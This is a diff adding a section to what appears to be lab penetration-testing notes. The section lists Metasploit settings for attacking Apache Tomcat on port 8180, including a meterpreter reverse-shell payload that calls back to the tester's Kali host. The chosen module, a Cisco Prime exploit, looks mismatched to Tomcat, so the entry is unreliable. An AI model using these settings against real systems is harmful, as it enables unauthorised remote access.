@@ -66,6 +66,20 @@ run
 
 ---
 
+### PORT 8180 – Apache Tomcat
+- **Service:** Apache Tomcat
+- **Exploit Module:** `exploit/unix/http/cisco_prime_inf_rce`  
+- **Payload:** `linux/x64/meterpreter/reverse_tcp`  
+- **Options to Set:**
+  ```bash
+  set RHOST <target IP>
+  set RPORT 8180
+  set LHOST <Kali IP>
+  ```
+- **Result:** Exploit completed but no session created, requires **manual placement of JSP payload** in `/opt/CSCOlumos` 
+
+---
+
 ### Tips
 - Always `nmap` first to find the right service version.
 - Use `search <service/version>` in Metasploit to find modules.
